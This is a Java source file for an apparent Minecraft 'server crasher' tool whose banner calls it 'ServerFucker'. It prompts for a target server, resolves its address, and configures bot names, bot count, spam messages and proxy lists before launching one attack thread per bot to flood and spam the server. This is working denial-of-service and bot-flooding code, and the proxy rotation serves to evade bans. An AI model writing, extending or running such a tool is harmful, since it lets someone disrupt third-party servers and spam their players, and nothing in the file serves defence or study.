package xyz.zihaoxu;

import com.google.gson.Gson;
import org.xbill.DNS.*;
import org.xbill.DNS.Record;
import xyz.zihaoxu.utils.Utils;

import javax.script.ScriptException;
import java.io.*;
import java.net.UnknownHostException;
import java.util.Objects;
import java.util.Scanner;
import java.util.stream.Collectors;

public class ServerCrasher { // Class: ServerCrasher
    public static String dnsServer="8.8.8.8";
    public static Configure configure=new Configure();
    public ServerCrasher(String[] args/*args*/){

    }

    public void run() throws IOException, ScriptException { // Method: run()
        Scanner scanner=new Scanner(System.in); // scanner
        System.out.println("==============================");
        System.out.println("ServerFucker - By 星空-幻想");
        System.out.println("==============================");

        // 加载脚本
        try {
            System.out.println("正在加载脚本");
            Main.scriptManager.init();
            Main.scriptManager.loadFolder(new File("scripts"));
        } catch (Throwable t) {
            System.err.println("脚本加载失败");
            t.printStackTrace();
        }

        File config_file=new File("config.json");
        if (config_file.exists()){
            System.out.println("检测到配置文件config.json,是否使用保存的配置?(true/false)");
            System.out.print("默认true: ");
            if (scanner.hasNextLine()){
                if (!Objects.equals(scanner.nextLine(), "false")){
                    Gson gson=new Gson();
                    configure=gson.fromJson(new FileReader(config_file), Configure.class);
                    attack();
                    return;
                }
            }
        }

        get_config(scanner);

        System.out.println("准备启动...");
        Main.scriptManager.call("pre_start");
        this.attack(); // this.run()
    }

    public void get_config(Scanner scanner) throws IOException {
        // region 设定目标
        System.out.println("崩服器即将启动,在那之前你需要填写一些信息");
        System.out.print("攻击的目标: ");
        String target = "";
        if (scanner.hasNextLine()){ // scanner.hasNextLine() 下同
            target= scanner.nextLine();
        }
        Main.scriptManager.call("target_selected", target); // target_selected事件
        System.out.println("正在解析地址");

        // region 这一整段都是那个抽了风的地址解析
        lookup_dns(target);
        // endregion

        // region 配置bot
        System.out.println("你希望机器人的名字以什么开头?");
        System.out.print("留空以随机: ");
        String prefix="";
        if(scanner.hasNextLine()){
            prefix=scanner.nextLine();
        }
        configure.name_prefix =prefix;
        System.out.print("你期望的机器人的数量: ");
        int count=100;
        if (scanner.hasNextLine()){
            count= Integer.parseInt(scanner.nextLine());
        }
        configure.thread_count =count;
        Main.scriptManager.call("bot_configured", prefix, count);
        // endregion

        System.out.println("是否以最小化运行?(true/false)");
        System.out.println("默认为false: ");
        String add_listener="";
        if (scanner.hasNextLine()){
            add_listener= scanner.nextLine();
        }
        configure.should_add_listener = Objects.equals(add_listener, "true");
        if (!configure.should_add_listener) {
            String text = "";
            System.out.println("你希望机器人进入服务器之后发送什么内容?");
            System.out.print("留空以不发送: ");
            if (scanner.hasNextLine()) {
                text = scanner.nextLine();
            }
            configure.spammer_text = text;
        }

        // region 配置代理
        System.out.println("最后一步,你希望使用代理吗?如果是,输入代理文件的地址(.txt格式)");
        System.out.print("留空以不使用: ");
        String proxy_file="";
        if (scanner.hasNextLine()){
            proxy_file= scanner.nextLine();
        }
        configure.proxy_file =proxy_file;
        if (proxy_file!=""){
            System.out.println("代理的类型是?(SOCKS4/SOCKS5/HTTP)");
            System.out.print("留空默认SOCKS4: ");
            String proxy_type="";
            if (scanner.hasNextLine()){
                proxy_type= scanner.nextLine();
            }
            if (!proxy_type.isEmpty()){
                configure.proxy_type =proxy_type;
            }
        }

        System.out.println("是否为您保存配置?(true/false)");
        System.out.print("默认true:");
        if (scanner.hasNextLine()){
            if (!Objects.equals(scanner.nextLine(), "false")){
                save_configure();
            }
        }
        // endregion
    }

    private void lookup_dns(String target) throws TextParseException, UnknownHostException {
        String host;
        int port=25565;
        String[] temp = target.split(":");
        if (temp.length==2){
            host=temp[0];
            port=Integer.parseInt(temp[1]);
        }else {
            Lookup lookup=new Lookup("_minecraft._tcp."+temp[0], Type.SRV);
            lookup.setResolver(new SimpleResolver(dnsServer));
            Record[] records=lookup.run();
            if (records!=null && records.length>0){
                System.out.println("检测到srv记录,将使用srv解析结果");
                host=((SRVRecord)records[0]).getTarget().toString().replaceFirst("\\.$", "");
                port=((SRVRecord)records[0]).getPort();
            }else {
                host=temp[0];
            }
        }
        if (!Objects.equals(host, "127.0.0.1") && !Objects.equals(host, "localhost")) {
            Lookup lookup = new Lookup(host, Type.A);
            lookup.setResolver(new SimpleResolver(dnsServer));
            Record[] records = lookup.run();
            if (records != null && records.length > 0) {
                host = ((ARecord) records[0]).getAddress().getHostAddress();
            }
        }
        System.out.println("解析完成:"+host+":"+port);
        // endregion
        Main.scriptManager.call("dns_resolved", host, port);
        configure.host =host; // Configure.host = host;
        configure.port =port; // Configure.port = port;
    }

    public void attack() throws FileNotFoundException { // run()
        if (configure.proxy_file!=""){
            File llIlIIl = new File(configure.proxy_file);
            BufferedReader reader=new BufferedReader(new FileReader(llIlIIl));
            Utils.proxies =reader.lines().collect(Collectors.toList());
        }

        for (int i = 0; i< configure.thread_count; i++){
            new Thread(new AttackThread()).start();
        }
        new Thread(new AutoGC()).start();
        // 这个就是我在群里发的那个gc循环的线程
        // 当然后面发现有没有其实没啥不同
    }

    private void save_configure() throws IOException {
        Gson gson=new Gson();
        String conf=gson.toJson(configure);
        File file=new File("config.json");
        BufferedWriter bw=new BufferedWriter(new FileWriter(file));
        bw.write(conf);
        bw.close();
    }
}